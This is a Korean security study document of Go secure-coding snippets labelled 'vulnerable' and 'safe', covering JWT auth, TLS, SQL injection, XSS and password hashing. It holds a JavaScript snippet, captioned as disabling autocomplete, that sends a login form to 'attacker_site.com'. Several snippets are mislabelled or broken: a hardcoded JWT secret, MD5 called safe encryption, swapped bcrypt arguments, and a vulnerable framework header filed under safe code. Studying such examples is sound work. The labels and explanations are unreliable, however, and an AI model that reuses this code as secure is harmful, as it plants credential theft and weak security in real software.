안녕하세요. SUA 오픈소스 보안 스터디입니다.

## access-control

**_안전한 코드_**
```golang
// 현재 시각으로부터 30분간 토큰과 쿠키를 생성시키는 코드  
// 시간이 지나면 만료가 되어, 토큰과 쿠키를 재발급 해야함

    expireToken := time.Now().Add(time.Minute * 30).Unix()
    expireCookie := time.Now().Add(time.Minute * 30)
```
<br/>

```golang
// JWT라고 불리는 JSON의 웹 토큰을 사용하여 인증을 강화합니다.
// NewWithClaims = 함수에 원하는 서명 메소드와 자신이 정의한 구조체를 넣어두는 곳  
// SignedString = jwt.NewWithClaims 함수로부터 값을 전달받고 토큰을 서명한다.

    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    signedToken, _ := token.SignedString([]byte("secret"))
```
<br/>

```golang
// 저장할 데이터의 JWT 스키마의 작성 예시는 다음과 같음
    type Claims struct {
      Username string `json:"username"`
      jwt.StandardClaims
    }
```
<br/>

```golang
// 다음 코드는 쿠키 파라미터를 세팅하는 코드이다.  
// 30분 후 만료되며, HTTP 전용이다. 경로와 도메인도 설정되어 있다.

cookie := http.Cookie{Name: "Auth", Value: signedToken, Expires: expireCookie, HttpOnly: true, Path: "/", Domain: "127.0.0.1", Secure: true}
http.SetCookie(res, &cookie)
http.Redirect(res, req, "/profile", http.StatusTemporaryRedirect)
```
<br/>

```golang
// 이번 함수는 개인 페이지를 보호해주는 기능을 수행한다.

func validate(page http.HandlerFunc) http.HandlerFunc {
	return func(res http.ResponseWriter, req *http.Request) {
		cookie, err := req.Cookie("Auth")
		if err != nil {
			res.Header().Set("Content-Type", "text/html")
			fmt.Fprint(res, "Unauthorized - Please login <br>")
			fmt.Fprintf(res, "<a href=\"login\"> Login </a>")
			return
		}

		token, err := jwt.ParseWithClaims(cookie.Value, &Claims{}, func(token *jwt.Token) (interface{}, error) {
			if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
				return nil, fmt.Errorf("unexpected signing method")
			}
			return []byte("secret"), nil
		})
		if err != nil {
			res.Header().Set("Content-Type", "text/html")
			fmt.Fprint(res, "Unauthorized - Please login <br>")
			fmt.Fprintf(res, "<a href=\"login\"> Login </a>")
			return
		}

		if claims, ok := token.Claims.(*Claims); ok && token.Valid {
			ctx := context.WithValue(req.Context(), MyKey, *claims)
			page(res, req.WithContext(ctx))
		} else {
			res.Header().Set("Content-Type", "text/html")
			fmt.Fprint(res, "Unauthorized - Please login <br>")
			fmt.Fprintf(res, "<a href=\"login\"> Login </a>")
			return
		}
	}
}
```
<br/>

```golang
// 이 함수는 클라이언트에 유효한 토큰이 있는 경우에만 볼 수 있게 해주는 기능을 수행한다.

func protectedProfile(res http.ResponseWriter, req *http.Request) {
	claims, ok := req.Context().Value(MyKey).(Claims)
	if !ok {
		res.Header().Set("Content-Type", "text/html")
		fmt.Fprint(res, "Unauthorized - Please login <br>")
		fmt.Fprintf(res, "<a href=\"login\"> Login </a>")
		return
	}
	url := req.URL.Query().Get("page")

	if url == "page2" {
		res.Header().Set("Content-Type", "text/html")
		fmt.Fprint(res, "PAGE 2 <br>")
		fmt.Fprintf(res, "<a href=\"logout\"> Logout </a>")
	} else {
		res.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(res, "Hello %s <br>", claims.Username)
		fmt.Fprintf(res, "<a href=\"logout\"> Logout </a>")
	}
}
```
<br/>

```golang
// 이 코드는 쿠키를 제거하는 역할을 수행한다.
func logout(res http.ResponseWriter, req *http.Request) {
	deleteCookie := http.Cookie{Name: "Auth", Value: "none", Expires: time.Now()}
	http.SetCookie(res, &deleteCookie)
}
```

## communication-security

**_취약한 코드_**
```golang
// 검증의 과정을 제대로 수행하지 않기 때문에 취약해질 가능성이 있다.

   log.Fatal(http.ListenAndServeTLS(":443", "yourCert.pem", "yourKey.pem", nil))
```
<br/>

**_안전한 코드_**
```golang
// 다음처럼 검증을 하는 것이 중요하다.

 var certs []Certificates
    certs = append(certs, Certificates{
        CertFile: "../etc/yourSite.pem", //본인 사이트의 인증서 키 
        KeyFile:  "../etc/yourSite.key",  // 본인 사이트의 개인키
    })

    config := &tls.Config{}
    var err error
	
    config.Certificates = make([]tls.Certificate, len(certs))
    for i, v := range certs {
	// LoadX509KeyPair = 파일에서 공개/개인 키를 읽으면서 분석한다.
        config.Certificates[i], err = tls.LoadX509KeyPair(v.CertFile, v.KeyFile)
    }
```
<br/>

```golang
// WebSocket에서 보안을 수행하는 과정임  
// Header에서 값을 가져와, 값이 호스트와 같은지 비교
// 같지 않으면 에러가 발생
	if r.Header.Get("Origin") != "http://"+r.Host{
		http.Error(w, "Origin not allowed", 403)
			return
	}else{
		websocket.Handler(EchoHandler).ServeHTTP(w, r)
	}
```
<br/>

## data_protection

* 다음은 데이터를 암호화하여 보호하는 과정을 나타내는 코드이다.<br/><br/>
**_예시 코드_**
```golang
// 반환 값은 "change this password to a secret"이다.
secretKeyBytes, err := hex.DecodeString("6368616e676520746869732070617373776f726420746f206120736563726574")
if err != nil {
    panic(err)
}

var secretKey [32]byte
// secretKey = "change this password to a secret"
copy(secretKey[:], secretKeyBytes)

var nonce [24]byte
if _, err := rand.Read(nonce[:]); err != nil {
    panic(err)
}

encrypted := secretbox.Seal(nonce[:], []byte("hello world"), &nonce, &secretKey)

var decryptNonce [24]byte
copy(decryptNonce[:], encrypted[:24])

decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], &decryptNonce, &secretKey)
if !ok {
    panic("decryption error")
}

fmt.Println(string(decrypted))
```
<br/>

**_취약한 코드_**
```golang
// 복호화를 하는 과정에서, 암호화 할 때 사용한 것과 동일한 nonce와 키를 사용하지 않았고,  
// 이 과정에서 취약점으로 이어질 수 있다.

var decryptNonce [24]byte
copy(decryptNonce[:], encrypted[:24])
decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], &decryptNonce, &secretKey)
```
<br/>

**_안전한 코드_**
```golang
// 데이터를 보호하는 방법은 여러가지 있는데, 그 중 하나가 비활성화이다.  
// 특정 양식에서 자동완성을 비활성화 하는 방법이다.
<form method="post" action="/form" autocomplete="off">
<input type="text" id="cc" name="cc" autocomplete="off">
```
<br/>

```golang
// 로그인 양식에서 자동완성을 비활성화 하는 코드이다.

window.setTimeout(function() {
  document.forms[0].action = 'http://attacker_site.com';
  document.forms[0].submit();
}
), 10000);
```
<br/>

```golang
// 민감한 정보가 포함된 페이지의 캐시 제어를 비활성화 하는 코드이다.
w.Header().Set("Cache-Control", "no-cache, no-store")
w.Header().Set("Pragma", "no-cache")
```
<br/>

## file_management

**_안전한 코드_**
```golang
// 파일 관리에서 보안 설정을 하는 방법은 다음과 같다.  

{...}
buff := make([]byte, 512)
_, err = file.Read(buff)
{...}

filetype := http.DetectContentType(buff)

// 버퍼에 쓰여진 데이터를 보고 파일 타입을 지정한 다음에, 지정한 파일 타입만 허용하는 코드
{...}
switch filetype {
case "image/jpeg", "image/jpg":
  fmt.Println(filetype)
case "image/gif":
  fmt.Println(filetype)
case "image/png":
  fmt.Println(filetype)
default:
  fmt.Println("unknown file type uploaded")
}
{...}
```

## output-encoding

**_취약한 코드_**
```golang
// 다음에 나오는 코드는 SQL Injection에 취약한 코드이다.  
// 변수값이 그대로 쿼리에 주입되기 때문에 취약하다고 볼 수 있다.

func main(){
	ctx:=context.Background()
	customerId := r.URL.Query.Get("id")
  
	query := "SELECT number, expireDate, cvv FROM creditcards WHERE customerId = "+customerId
	row, _ = db.QueryContext(ctx, query)
}
```
<br/>

**_안전한 코드_**
```golang
// SQL Injection으로부터 안전해지기 위해, 다음과 같은 코드를 작성한다.  
// SQL Injection을 시도하려고 해도 '?' 때문에 쿼리로 인식하지 않게 한다.

func main(){
	ctx:=context.Background()
	customerId := r.URL.Query.Get("id")

	query := "SELECT number, expireDate, cvv FROM creditcards WHERE customerId = ?"
	row, _ = db.QueryContext(ctx, query, customerId)
}
```
<br/>

**_취약한 코드_**
```golang
// 다음은 XSS에 취약해지게 되는 코드이다.  
// 입력값을 검증하는 과정을 거치지 않는다.

package main

import "net/http"
import "io"

func handler (w http.ResponseWriter, r *http.Request) {
    io.WriteString(w, r.URL.Query().Get("param1"))
}

func main () {
    http.HandleFunc("/", handler)
    http.ListenAndServe(":8070", nil)
}
```
<br/>

**_안전한 코드_**
```golang
package main

import "net/http"
import "text/template"

func handler(w http.ResponseWriter, r *http.Request) {
        param1 := r.URL.Query().Get("param1")
	
        tmpl := template.New("hello")
        tmpl, _ = tmpl.Parse(`{{define "T"}}{{.}}{{end}}`)
        tmpl.ExecuteTemplate(w, "T", param1)
}

func main() {
        http.HandleFunc("/", handler)
        http.ListenAndServe(":8070", nil)
}
```
<br/>

```golang
// 이 패키지는 HTML 출력을 자동으로 보호해주는 패키지이다.
import "text/template"
```
<br/>

```golang
// 이 과정에서 HTML 템플릿의 문맥을 자동으로 이스케이프 해준다.
        tmpl := template.New("hello")
        tmpl, _ = tmpl.Parse(`{{define "T"}}{{.}}{{end}}`)
        tmpl.ExecuteTemplate(w, "T", param1)
```

## system_configuration.  

**_취약한 코드_**
```golang
// 디렉토리 인덱싱 공격에 취약한 코드다.
// FileServer 메소드는 서버에 저장된 파일들을 보여준다.  
// 이 과정에서 보여주길 원하지 않는 파일도 보여줄 수 있게 된다.

http.ListenAndServe(":8080", http.FileServer(http.Dir("/tmp/static")))
```

**_안전한 코드_** 
```golang
// Proto는 무시되고 HTTP/1.1을 사용하여 요청하게 된다.

req, _ := http.NewRequest("POST", url, buffer)
req.Proto = "HTTP/1.0"
```
<br/>

```golang
// 디렉토리 목록을 비활성화 하게 하는 코드이다.

type justFilesFilesystem struct {
    fs http.FileSystem
}
```
<br/>

```golang
// 요청된 경로와 파일이 표시될 수 있는지의 여부를 확인하는 기능을 수행한다.

func (fs justFilesFilesystem) Open(name string) (http.File, error) {
    f, err := fs.fs.Open(name)
    if err != nil {
        return nil, err
    }
    return neuteredReaddirFile{f}, nil
}
```
<br/>

```golang
// tmp/static/ 경로만 표시하도록 하는 기능을 수행한다.

fs := justFilesFilesystem{http.Dir("tmp/static/")}
http.ListenAndServe(":8080", http.StripPrefix("/tmp/static", http.FileServer(fs)))
```
<br/>

```golang
// X-Request-With 헤더를 Go vulnerable Framework 1.2로 설정하는 코드이다.

w.Header().Set("X-Request-With", "Go Vulnerable Framework 1.2")
```
<br/>

```golang
// POST, GET 메소드만 허용하게 하는 코드이다.
w.Header().Set("Access-Control-Allow-Methods", "POST, GET")
```
<br/>

```golang
// Allow에 명시된 경로만 허용하고 나머지는 전부 거부하는 설정이다

User-agent: *
Allow: /sitemap.xml
Allow: /index
Allow: /contact
Allow: /aboutus
Disallow: /
```
<br/>

## Authentication-Password-Management

**_안전한 코드_**
```golang
// 패스워드를 비활성화한다.
// password Type을 사용함으로써 패스워드가 사용자 화면에서 보이지 않게 한다.
<input type="password" name="passwd" autocomplete="off" />
```
```golang
// POST로 form 데이터를 전송하며, Token도 같이 보낸다.
<form method="post" action="https://somedomain.com/user/signin" autocomplete="off">
    <input type="hidden" name="csrf" value="CSRF-TOKEN" />

    <label>Username <input type="text" name="username" /></label>
    <label>Password <input type="password" name="password" /></label>

    <input type="submit" value="Submit" />
</form>
```
```golang
<form method="post" action="https://somedomain.com/user/signin" autocomplete="off">
    <input type="hidden" name="csrf" value="CSRF-TOKEN" />
    
    // ID, PASSWD중 하나만 틀렸다고 해도, 어느 부분이 잘못되었는지 알리면 안된다.
    // "아이디나 패스워드 중 하나가 잘못되었다"고 해야한다.
    <div class="error">
        <p>Invalid username and/or password</p>
    </div>

    <label>Username <input type="text" name="username" /></label>
    <label>Password <input type="password" name="password" /></label>

    <input type="submit" value="Submit" />
</form>
```
<br/>

**_안전한 코드_**
```golang
package main

import (
    "database/sql"
    "context"
    "fmt"

    "golang.org/x/crypto/bcrypt"
)

func main() {
    ctx := context.Background()
    email := []byte("john.doe@somedomain.com")
    password := []byte("47;u5:B(95m72;Xq")

    // bcrypt로 패스워드를 암호화 함
    hashedPassword, err := bcrypt.GenerateFromPassword(password, bcrypt.DefaultCost)
    if err != nil {
        panic(err)
    }

    // DB에 반드시 연결이 되어 있어야 함
    stmt, err := db.PrepareContext(ctx, "INSERT INTO accounts SET hash=?, email=?")
    if err != nil {
        panic(err)
    }
    result, err := stmt.ExecContext(ctx, hashedPassword, email)
    if err != nil {
        panic(err)
    }
}


ctx := context.Background()

// 검증할 인증 정보
email := []byte("john.doe@somedomain.com")
password := []byte("47;u5:B(95m72;Xq")

// 제공된 전자 메일에 해당되는 해시된 암호를 가져옴
record := db.QueryRowContext(ctx, "SELECT hash FROM accounts WHERE email = ? LIMIT 1", email)

var expectedPassword string
if err := record.Scan(&expectedPassword); err != nil {
   // 유저가 없으면

   // 로그를 남겨야 하지만 실행한다
   // 계속 진행한다
}

if bcrypt.CompareHashAndPassword(password, []byte(expectedPassword)) != nil {
   // 패스워드가 일치하지 않으면
   // 로그에 남깁니다

   // 오류에 반환되어야 "로그인 시도에 실패했습니다. 자격 증명을 확인하세요"라는 메시지가 사용자에게 뜹니다.
}
```
<br/>

## Cryptographic-Practice

* 기본적으로 암호화와 복호화는 다음과 같이 진행된다.
```golang
// 암호화
encrypted_data := F(data, key)
```
```golang
// 복호화
data := F⁻¹(encrypted_data, key)
```
<br/>

**_안전한 코드_**
```golang
func main () {
        h_md5 := md5.New()
        h_sha := sha256.New()
        h_blake2s, _ := blake2s.New256(nil)
	
	// md5로 암호화
        io.WriteString(h_md5, "Welcome to Go Language Secure Coding Practices")

	// sha256으로 암호화
        io.WriteString(h_sha, "Welcome to Go Language Secure Coding Practices")

	// blake2로 암호화
	// black2 : MD5, SHA-1, SHA-2, SHA-3보다 빠른 암호화 해시 함수, SHA-3만큼 안전
        io.WriteString(h_blake2s, "Welcome to Go Language Secure Coding Practices")
        fmt.Printf("MD5        : %x\n", h_md5.Sum(nil))
        fmt.Printf("SHA256     : %x\n", h_sha.Sum(nil))
        fmt.Printf("Blake2s-256: %x\n", h_blake2s.Sum(nil))
}
```
<br/>

## database-security

**_취약한 코드_**
```golang
// 입력값을 따로 검증하지 않아, 사용자 ID에 대한 모든 정보에 액세스 할 수 있음
SELECT * FROM tblUsers WHERE userId = $user_input
```

**_안전한 코드_**

```golang
// 파라미터를 받아서 매개변수화 시켜 '?' 변수에 할당
// SQL Injection 예방
customerName := r.URL.Query().Get("name")
db.Exec("UPDATE creditcards SET name=? WHERE customerId=?", customerName, 233, 90)
```
<br/>

```golang
// 저장 프로시저를 사용하요 웹 응용 프로그램에 대한 새로운 보호 계층을 만듬

// 저장 프로시저를 사용하면 일반 쿼리를 사용하는 대신 쿼리에 대한 특정 보기를 만들어 
// 민감한 정보가 보관되지 않도록 할 수 있음
CREATE PROCEDURE db.getName @userId int = NULL
AS
    SELECT name, lastname FROM tblUsers WHERE userId = @userId
GO
```
<br/>

```golang
func main() {
    db, err := sql.Open("mysql", "user:@/cxdb")
    if err != nil {
        log.Fatal(err)
    }
    p := &program{db: db}
    p.base, p.cancel = context.WithCancel(context.Background())

    // 프로그램 종료 요청 대기, 요청 시 기본 컨텍스트 취소
    go func() {
        osSignal := // ...
        select {
        case <-p.base.Done():
        case <-osSignal:
            p.cancel()
        }
        // 선택적으로 OS를 호출하기 전에 N 밀리초 동안 기다림.
    }()

    err =  p.doOperation()
    if err != nil {
        log.Fatal(err)
    }
}
```
<br/>

```golang
<connectionDB>
  <serverDB>localhost</serverDB>
  <userDB>f00</userDB>
  <passDB>f00?bar#ItsP0ssible</passDB>
</connectionDB>
```
<br/>

```golang
// Go파일에서 DB설정 파일을 호출함
configFile, _ := os.Open("../private/configDB.xml")

// 파일을 읽고 데이터베이스 연결을 만듬
db, _ := sql.Open(serverDB, userDB, passDB)
```
<br/>

## error-handling-logging

**_안전한 코드_**
```golang
if err != nil {
    // 오류 처리
}

// 오류 출력 예시
{...}
if f < 0 {
    return 0, errors.New("math: square root of negative number")
}
//에러가 발생하면 에러를 출력함
if err != nil {
    fmt.Println(err)
}
{...}


// 오류가 발생한다면 정상 실행으로 돌아갈 수 있도록 하는 코드
func main () {
    start()
    fmt.Println("Returned normally from start().")
}

func start () {
    defer func () {
        if r := recover(); r != nil {
            fmt.Println("Recovered in start()")
        }
    }()
    fmt.Println("Called start()")
    part2(0)
    fmt.Println("Returned normally from part2().")
}

func part2 (i int) {
    if i > 0 {
        fmt.Println("Panicking in part2()!")
        panic(fmt.Sprintf("%v", i))
    }
    defer fmt.Println("Defer in part2()")
    fmt.Println("Executing part2()")
    part2(i + 1)
}
```
<br/>

```golang
// 성공적인 보안 이벤트와 실패한 보안 이벤트를 모두 다뤄야 함
func main() {
    var buf bytes.Buffer
    var RoleLevel int

    logger := log.New(&buf, "logger: ", log.Lshortfile)

    fmt.Println("Please enter your user level.")
    fmt.Scanf("%d", &RoleLevel) //<--- example

    switch RoleLevel {
    case 1:
        // 로그인 성공
        logger.Printf("Login successful.")
        fmt.Print(&buf)
    case 2:
        // 실패한 로그인
        logger.Printf("Login unsuccessful - Insufficient access level.")
        fmt.Print(&buf)
     default:
        // 지정되지 않은 오류
        logger.Print("Login error.")
        fmt.Print(&buf)
    }
}


// 암호화 해시 함수를 추가하여 로그 변조가 발생하지 않도록 함
{...}

// 체크섬 파일에서 알려진 로그 체크섬을 가져옴
logChecksum, err := ioutil.ReadFile("log/checksum")
str := string(logChecksum) // 내용을 문자열로 반환

// 현재 로그의 SHA256 해시 계산
b, err := ComputeSHA256("log/log")
if err != nil {
  fmt.Printf("Err: %v", err)
} else {
  hash := hex.EncodeToString(b)
  // 계산된 해시를 저장된 해시와 비교함

  if str == hash {
    // 확인 체크섬이 일치
    fmt.Println("Log integrity OK.")
  } else {
    // 파일 무결성이 손상됨
    fmt.Println("File Tampering detected.")
  }
}
{...}
```
<br/>

## input-validation
**_안전한 코드_**
```golang
func main() {
 // serveMux는 들어오는 요청을 등록된 패턴과 일치시키는 데 사용됨
 // 요청된 URL과 가장 근접하게 일치하는 핸들러를 호출함
  mux := http.NewServeMux()

  rh := http.RedirectHandler("http://yourDomain.org", 307)
  mux.Handle("/login", rh)

  log.Println("Listening...")
  http.ListenAndServe(":3000", mux)
}
```
<br/>

## memory-management
```golang
// go에서는 string이 null로 끝나지 않는다
type StringHeader struct {
    Data uintptr
    Len  int
}

func main() {
    strings := []string{"aaa", "bbb", "ccc", "ddd"}
    // 루프는 MAP 길이를 확인하지 않는다
    for i := 0; i < 5; i++ {
        if len(strings[i]) > 0 {
            fmt.Println(strings[i])
        }
    }
}

// 출력
aaa
bbb
ccc
ddd
panic: runtime error: index out of range
```
